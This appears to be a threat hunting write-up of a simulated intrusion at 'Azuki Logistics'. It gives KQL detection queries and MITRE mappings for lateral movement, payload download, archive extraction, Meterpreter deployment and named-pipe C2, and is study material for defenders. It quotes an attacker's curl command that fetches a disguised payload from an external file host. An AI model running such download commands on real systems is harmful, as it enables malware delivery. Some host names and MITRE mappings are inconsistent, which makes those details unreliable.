# Azuki Logistics — Multi-Host Threat Hunting Investigation

This repository documents a full end-to-end threat hunting investigation into a multi-host intrusion affecting **Azuki Logistics**.  
The case study reconstructs attacker activity from lateral movement through credential theft and data exfiltration using Microsoft Defender for Endpoint telemetry.

## Case Navigation

### Core Narrative
- [Introduction](01_Introduction.md)
- [Scenario Overview](02_Scenario_Overview.md)
- [Full Timeline](03_Timeline.md)

### Analytic Findings
- [Starting Point](findings/00_Starting_Point.md)
- [Lateral Movement](findings/01_Lateral_Movement.md)
- [Execution](findings/02_Execution.md)
- [Persistence](findings/03_Persistence.md)
- [Discovery](findings/04_Discovery.md)
- [Collection](findings/05_Collection.md)
- [Exfiltration](findings/06_Exfiltration.md)
- [Credential Store Compromise](findings/07_Credential_Store_Compromise.md)

### MITRE ATT&CK Analysis
- [MITRE Mapping Table](mitre/MITRE_Mapping_Table.md)
- [MITRE Summary by Tactic](mitre/MITRE_Summary_By_Tactic.md)
- [MITRE ATT&CK Narrative](mitre/MITRE_Narrative.md)

### Wrap-Up
- [Conclusion & Recommendations](99_Conclusion_and_Recommendations.md)

# Introduction

This report documents a multi-host intrusion affecting **Azuki Logistics**, beginning on November 24 and culminating in confirmed data exfiltration and credential compromise.

The investigation centers on **azuki-adminpc**, an administrative workstation accessed through unauthorized lateral movement from an already compromised internal system.

All findings are derived from Microsoft Defender for Endpoint telemetry, including:

- `DeviceLogonEvents`  
- `DeviceProcessEvents`  
- `DeviceFileEvents`  
- `DeviceNetworkEvents`  

This report demonstrates a structured, hypothesis-driven threat hunting methodology suitable for enterprise SOC operations.

# Scenario Overview

Following an earlier breach, an attacker reused valid credentials to pivot laterally into **azuki-adminpc**, a system associated with elevated privileges.

Once access was established, the attacker:

- Downloaded malware from rotated external infrastructure
- Deployed a Meterpreter-based C2 implant
- Created persistent backdoor accounts
- Conducted internal reconnaissance
- Staged and archived sensitive data
- Exfiltrated data using cloud-based file hosting

The intrusion reflects deliberate, hands-on-keyboard tradecraft rather than automated malware execution.

# Starting Point — Identification

## Objective
Identify the primary investigative pivot and establish scope.

## Finding
**azuki-admin-pc** surfaced as the earliest system exhibiting RemoteInteractive logons from a compromised internal IP, followed by execution, persistence, and exfiltration activity.

This endpoint became the anchor for reconstructing the full intrusion lifecycle.

# Analytic Finding 1: Lateral Movement

## Source Identification
RemoteInteractive logons originated from **10.1.0.204**, an internally compromised system.

## Compromised Account
The attacker reused the valid account **yuki.tanaka**.

## Target System
The destination system was **azuki-adminpc**, a high-value administrative workstation.

## KQL Query Used
```kql
let start = datetime(2025-11-24T00:00:00Z);
let end   = datetime(2025-11-25T00:00:00Z);
DeviceLogonEvents
| where Timestamp between (start .. end)
| where DeviceName contains "azuki-admin-pc"
| where AccountName contains "yuki.tanaka"
| where isnotempty(RemoteIP)
| project Timestamp, AccountName, DeviceName, RemoteIP
```

### Why This Matters
Credential-based lateral movement significantly increases blast radius and bypasses perimeter defenses. Credential reuse is one of the most dangerous lateral movement techniques because it bypasses many traditional security controls. When attackers authenticate using valid accounts, their activity blends into normal authentication patterns, reducing the likelihood of immediate detection.

The use of **yuki.tanaka** to access an administrative workstation significantly increases the potential impact of the intrusion. It implies that the attacker can move freely between systems without triggering exploit-based alerts and may reuse the same credentials to access additional hosts. This behavior aligns with **MITRE ATT&CK technique T1078: Valid Accounts** and represents a critical escalation point in the intrusion lifecycle, often preceding privilege abuse, persistence establishment, and data exfiltration.

# Analytic Finding 4/5: External Payload Hosting Infrastructure & Malware Download Command

## Objective
Identify the external infrastructure leveraged by the attacker to stage and deliver malicious payloads to the compromised administrative workstation. Understanding attacker-controlled or attacker-abused hosting services is critical for containment, threat intelligence enrichment, and future prevention.

## Finding
At `2025-11-25T04:21:12.0783558Z`, the attacker utilized the anonymous file-hosting service **litter.catbox.moe** to stage and deliver a malicious archive to **azuki-adminpc**. This domain was contacted during the malware download phase and served as the hosting location for attacker-controlled payloads masquerading as legitimate system files.

The use of a public, anonymous file-hosting service indicates deliberate infrastructure rotation and an attempt to evade static domain allowlists and reputation-based security controls.

## Evidence
Network telemetry from **DeviceNetworkEvents** revealed outbound connections from **azuki-adminpc** to the domain **litter.catbox.moe** during the initial execution phase of the intrusion. These connections coincided directly with subsequent file creation events in a temporary cache directory, confirming that the domain was used as a payload staging location rather than benign browsing activity.

The domain differs from infrastructure observed in earlier intrusion activity, demonstrating that the attacker intentionally rotated hosting services between operations. This behavior aligns with common adversary tradecraft designed to reduce detection by threat intelligence feeds and security controls that rely on previously known indicators.

Process execution data revealed that the payload was retrieved using the following command-line invocation:

`"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`

The filename closely resembles a legitimate Windows update identifier, reinforcing the attacker’s attempt to disguise malicious activity as routine system maintenance. The tight temporal correlation between the outbound network connection and the file write event establishes a clear execution chain linking external infrastructure to local payload delivery.

## KQL Query Used
```kql
let start = datetime(2025-11-24T00:00:00Z); 
let end   = datetime(2025-11-25T23:59:59Z);
DeviceNetworkEvents 
| where Timestamp between (start .. end)
| where DeviceName == "azuki-adminpc"
| where isnotempty(RemoteUrl)
| where InitiatingProcessFileName contains "curl"
| project Timestamp, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
```

## KQL Query Result

<img width="1046" height="232" alt="image" src="https://github.com/user-attachments/assets/8e5f027c-6492-4e49-a5c2-1f26853df810" />

### Why This Matters

External payload staging combined with scripted download utilities represents a critical transition point in an intrusion—from access to active execution. By abusing `litter.catbox.moe`, the attacker avoided hosting their own infrastructure while blending malicious traffic into a service that also supports legitimate use cases.

The use of `curl.exe` to retrieve a payload disguised as a Windows update demonstrates deliberate tradecraft. Command-line download tools provide reliability, automation, and flexibility, allowing attackers to deliver payloads quietly and repeatably without relying on browser-based interaction. Because `curl.exe` is commonly present on modern Windows systems, its execution may not immediately appear suspicious without behavioral context.

The fact that a single analytic query surfaced both the malicious domain contact and the associated download command highlights the importance of correlating network and process telemetry. Detecting this pattern early enables defenders to disrupt the attack chain before payload execution, persistence, or lateral expansion occurs. This behavior aligns with **MITRE ATT&CK technique T1608.001: Stage Capabilities and T1105: Ingress Tool Transfer**, both of which are commonly observed during early execution phases of hands-on-keyboard intrusions.

# Analytic Finding 6: Password-Protected Archive Extraction

## Objective
Determine whether the attacker deliberately extracted a password-protected archive to deobfuscate staged payloads and prepare them for execution on the compromised administrative workstation.

## Finding
The attacker extracted a password-protected archive on **azuki-adminpc** using a legitimate compression utility, indicating a deliberate attempt to deobfuscate and access malicious payloads that were intentionally protected to evade basic inspection and security scanning.

The extraction command included an explicit password parameter and directed output to the same temporary cache directory used during the initial download phase, demonstrating a controlled and scripted execution flow rather than ad hoc user interaction.

## Evidence
At `2025-11-25T04:21:32.2579357Z`, process telemetry from **DeviceProcessEvents** revealed execution of the following command shortly after the malicious archive was downloaded:

`"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`

This command confirms that the attacker:
- Used a trusted, commonly installed compression tool  
- Supplied a password to decrypt the archive contents  
- Extracted files directly into a system cache directory  
- Suppressed prompts to ensure non-interactive execution  

The timing of this activity occurred immediately after the payload download and directly preceded the appearance of attacker-controlled executables on disk, establishing a clear execution chain from payload staging to payload deployment.

## KQL Query Used
```kql
let start = datetime(2025-11-24);
let end   = datetime(2025-11-30);
DeviceProcessEvents // flag 6
| where Timestamp between (start .. end)
| where DeviceName == "azuki-adminpc"
| where FileName has_any ("7z.exe", "7za.exe", "tar.exe", "winrar.exe")
| where ProcessCommandLine has_any ("-p", "password", "x ", "e ")
| project Timestamp, DeviceName, FileName, ProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="988" height="198" alt="image" src="https://github.com/user-attachments/assets/a8de314e-402b-49e0-ac02-42bf320b1d2d" />

### Why This Matters

Password-protected archives are a common attacker technique used to evade static analysis, email inspection, and antivirus scanning. By encrypting the contents of the archive, attackers prevent security tools from inspecting payloads until they are actively extracted on the target system.

The use of a legitimate compression utility such as `7z.exe` further complicates detection, as these tools are frequently used for benign administrative tasks. However, when combined with prior indicators—such as anonymous payload hosting and scripted downloads—archive extraction becomes a strong signal of malicious intent.

This activity represents a decisive transition from payload delivery to payload preparation and execution. Detecting archive extraction with password parameters, especially when correlated with recent external downloads, provides defenders with a critical opportunity to interrupt the intrusion before command-and-control beacons, persistence mechanisms, or credential theft tools are launched. This behavior aligns with **MITRE ATT&CK technique T1140: Deobfuscate/Decode Files**, which is commonly observed during early execution stages of hands-on-keyboard intrusions.

# Analytic Finding 7: C2 Implant Deployment

## Objective
Determine whether the attacker deployed a command-and-control (C2) implant on the compromised administrative workstation following payload extraction, indicating a transition from payload preparation to active post-exploitation control.

## Finding
Following extraction of the password-protected archive, the attacker deployed a malicious executable identified as **meterpreter.exe** within the temporary cache directory on **azuki-adminpc**. The filename closely aligns with well-known offensive security tooling, indicating intentional deployment of a post-exploitation C2 implant rather than benign software.

The placement of the executable within a system cache directory suggests an attempt to blend malicious artifacts into locations that may receive less routine scrutiny, while maintaining proximity to previously staged payload components.

## Evidence
File system telemetry from **DeviceFileEvents** showed the creation and writing of executable files in `C:\Windows\Temp\cache` shortly after the archive extraction activity. Among these artifacts, **meterpreter.exe** was created, confirming successful deployment of the attacker’s C2 implant.

The creation of this executable occurred within the same execution window as the payload deobfuscation step and was initiated by processes consistent with scripted execution rather than interactive user behavior. The sequencing establishes a clear progression from external payload staging, to archive extraction, to implant deployment.

## KQL Query Used
```kql
let start = datetime(2025-11-24);
let end   = datetime(2025-11-30);
DeviceFileEvents
| where Timestamp between (start .. end)
| where DeviceName == "azuki-adminpc"
| where FolderPath startswith @"C:\Windows\Temp\cache"
| where ActionType in ("FileCreated","FileWritten")
| where FileName endswith ".exe" or FileName endswith ".dll"
| project Timestamp, FileName, FolderPath, ActionType,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

## KQL Query Result

<img width="803" height="265" alt="image" src="https://github.com/user-attachments/assets/0d3ad798-9843-460d-8b16-6dc6649b46e8" />

### Why This Matters

The deployment of a dedicated C2 implant represents a critical escalation in the intrusion lifecycle. At this stage, the attacker moves beyond payload delivery and preparation into persistent, interactive control of the compromised system.

Meterpreter-based implants provide attackers with extensive post-exploitation capabilities, including command execution, credential theft, lateral movement, and persistence establishment. Their deployment typically signals hands-on-keyboard activity rather than automated malware execution.

Detecting the creation of suspicious executables in conjunction with recent archive extraction and external payload downloads allows defenders to identify the precise moment an attacker gains operational control. This behavior aligns with **MITRE ATT&CK technique T1059: Command and Scripting Interpreter**, as well as broader post-exploitation tradecraft commonly observed in enterprise intrusions.

# Analytic Finding 8: Named Pipe C2 Channel Establishment

## Objective
Determine whether the deployed command-and-control (C2) implant established an inter-process communication channel indicative of active C2 operations on the compromised administrative workstation.

## Finding
Following deployment of the C2 implant, the attacker established a named pipe on **azuki-adminpc** at `2025-11-25T04:24:35.3398583Z`, consistent with Meterpreter-based command-and-control communication. The pipe name followed a recognizable offensive tooling pattern, confirming that the implant transitioned from passive presence to active operational control.

This activity demonstrates that the attacker was no longer staging or preparing tooling, but actively interacting with the compromised system through an established C2 channel.

## Evidence
Telemetry from **DeviceEvents** captured a **NamedPipeEvent** originating from the C2 implant process shortly after the executable was written to disk. Parsing of the event’s additional fields revealed the creation of the following named pipe:

`\Device\NamedPipe\msf-pipe-5902`

The naming convention aligns with known Metasploit Framework tradecraft, where dynamically generated pipe names are used for local command dispatch and payload interaction. The temporal proximity between implant deployment and named pipe creation establishes a clear progression from payload execution to live C2 control.

## KQL Query Used
```kql
let start = datetime(2025-11-25T04:21:33.118662Z);
let end   = datetime(2025-11-26);
DeviceEvents
| where Timestamp between (start .. end)
| where DeviceName == "azuki-adminpc"
| where ActionType == "NamedPipeEvent"
| extend ParsedFields = parse_json(AdditionalFields)
| extend PipeName = tostring(ParsedFields.PipeName)
| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, PipeName, InitiatingProcessCommandLine
```

## KQL Query Result

<img width="531" height="192" alt="image" src="https://github.com/user-attachments/assets/f7755f87-ef3e-4047-96ff-241f943f8a38" />

### Why This Matters

Named pipes are frequently abused by post-exploitation frameworks to facilitate stealthy local command-and-control communication between attacker tooling and injected processes. Unlike network-based C2 channels, named pipes operate entirely within the host, reducing network visibility and evading perimeter-based detections.

The creation of a Meterpreter-associated named pipe confirms that the attacker achieved interactive control of azuki-adminpc. At this stage, the intrusion has fully transitioned into hands-on-keyboard post-exploitation, enabling follow-on actions such as credential theft, lateral movement, persistence establishment, and data collection.

Detecting named pipe creation—especially when correlated with known C2 implant filenames and recent payload execution—provides defenders with a high-confidence indicator of active compromise. This behavior aligns with **MITRE ATT&CK technique T1090.001: Internal Proxy**, a common mechanism used by adversaries to route commands and maintain control within compromised systems.

